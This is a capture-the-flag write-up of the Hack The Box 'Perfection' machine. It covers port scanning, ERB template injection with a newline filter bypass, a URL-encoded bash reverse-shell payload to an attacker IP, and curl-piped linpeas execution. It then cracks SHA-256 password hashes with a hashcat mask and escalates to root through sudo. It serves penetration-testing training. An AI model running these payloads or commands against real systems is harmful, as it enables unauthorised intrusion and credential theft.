# HTB - Perfection
### TL;DR
This in an Ubuntu 22.04 machine running a web site vulnerable to SSTI, which is exploited to get a shell in the system. Regarding escalation, there is a hash in the file system that, after cracking, allows us to get a password for a sudoer user.
### KEYWORDS
Ruby, SSTI, hashcat mask attack, sudo.
### REFERENCES
https://github.com/ruby/webrick<br>
https://www.honeybadger.io/blog/ruby-template-performance-erb-haml-slim/<br>
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby<br>
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason

Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-02 15:20 EST
Nmap scan report for 10.10.11.253
Host is up, received user-set (0.088s latency).
Not shown: 62834 closed tcp ports (conn-refused), 2699 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 16.00 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv -n             

Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-02 15:21 EST
Nmap scan report for 10.10.11.253
Host is up, received user-set (0.086s latency).
Scanned at 2024-03-02 15:21:38 EST for 24s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80e479e85928df952dad574a4604ea70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=
|   256 e9ea0c1d8613ed95a9d00bc822e4cfe9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4
80/tcp open  http    syn-ack nginx
|_http-title: Weighted Grade Calculator
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds
```
Enumerate the web site with Firefox. It is a web tool to calculate weighted grades.

![perfection Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a1bb0cf0-7efd-454f-b4a1-553aa0f68328)

Enter any input to enumerate how the site works, just bear in mind weights must add up to 100. Capture with Burpsuite and inspect the response.

![perfection2 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c98ada60-2d1b-4c80-af7c-d1393c3f5270)

It seems the web site is made with WEBrick 1.7.0, which in turn relies on Ruby 3.0.2.
This is everthing we need to know to begin exploitation.
### USER
Investigating about WEBrick and Ruby I found these web sites:
- https://github.com/ruby/webrick
- https://www.honeybadger.io/blog/ruby-template-performance-erb-haml-slim

According to them, there are 3 Ruby templates: ERB, HAML and Slim, of which ERB seems to be the more common because is the one installed by default. Looking for Ruby ERB SSTI payloads I found these references:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby<br>

Let's start with the simplest payload which seems to be `<%= 7*7 %>`. If you enter it in the `category 1` field, a "Malicious input blocked" is reported, meaning an input filter must be in place.

![perfection3 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/fa3884a9-9828-49dc-9199-27f4f4f4d620)

Testing the application we find out it filters non-alphanumeric characters, and turns out the filter can be bypassed adding a `%0A` (newline) at the end of the payload.

![perfection4 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/22dd1d3c-d931-4f0a-be78-9f2c21a48095)

This time the application outputs value "49", meaning the SSTI vulnerability is confirmed. Start a listener and refer to HackTricks or PayloadsAllTheThings to prepare a reverse shell payload. Remember to URL-encode it before sending.<br>
<br>
For example, this payload was confirmed to be working.
```markdown
aaa%0A<%25%3d+system("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.xxx.xxx/1919+0>%261'")+%25>
```
![perfection5 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/23fdedc3-053c-4d4b-b672-35c752936257)

A reverse shell for user `susan` is received on port 1919.

![perfection6 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5451400c-4838-46a8-aa31-d2591d528db2)

Which can be used to retrieve the user flag.
### ROOT
Start from the low-priv reverse shell for user `susan`. Bearing in mind this is an "easy" box, we assume `linpeas.sh` will surely help to automatically discover a flaw.<br>
<br>
Run `linpeas.sh` and inspect the results.
```markdown
curl http://10.10.xxx.xxx/linpeas.sh | bash
```
Some interesting facts are revealed. First, `cron` jobs and Ruby scripts are found in susan's home.
```markdown
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
@reboot cd /home/susan/ruby_app && /usr/bin/ruby /home/susan/ruby_app/main.rb
```
Next, it seems `susan` is a sudoer.
```markdown
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```
Also, a cloud credentials file is found in susan's home.
```markdown
╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
-rw-r--r-- 1 root root 8192 May 14  2023 /home/susan/Migration/pupilpath_credentials.db
```
And finally, the tool reveals `susan` has received emails.
```markdown
╔══════════╣ Mails (limit 50)
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/spool/mail/susan
```
We could try to exploit the fact `susan` is a sudoer, but for this we would need to know her clear text password. Let's look for the password in the credentials file.
```markdown
> strings /home/susan/Migration/pupilpath_credentials.db

SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```
There is a hash for Susan Miller which looks like SHA-256.
```markdown
> hashid abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

Analyzing 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
```
Next step is to enumerate susan's email.
```markdown
> cat /var/mail/susan

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```
So we have found the password creation pattern. since we also have the password hash, we are in a position to launch a `hashcat` mask attack.
```markdown
> hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
```
This returns susan's password, which we can use to connect to the host via SSH.<br>
<br>
From the SSH shell, take the opportunity to enumerate the system.
```markdown
> uname -a && cat /etc/os-release

Linux perfection 5.15.0-97-generic #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
Now that we have susan's password we can enumerate her `sudo` configuration.
```markdown
> sudo -l

[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```
Nice, just proceed to spawn a root shell.
```markdown
> sudo su
```

![perfection7 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/730dbc75-1889-4f1d-a149-6a021b9834f2)

You are root.
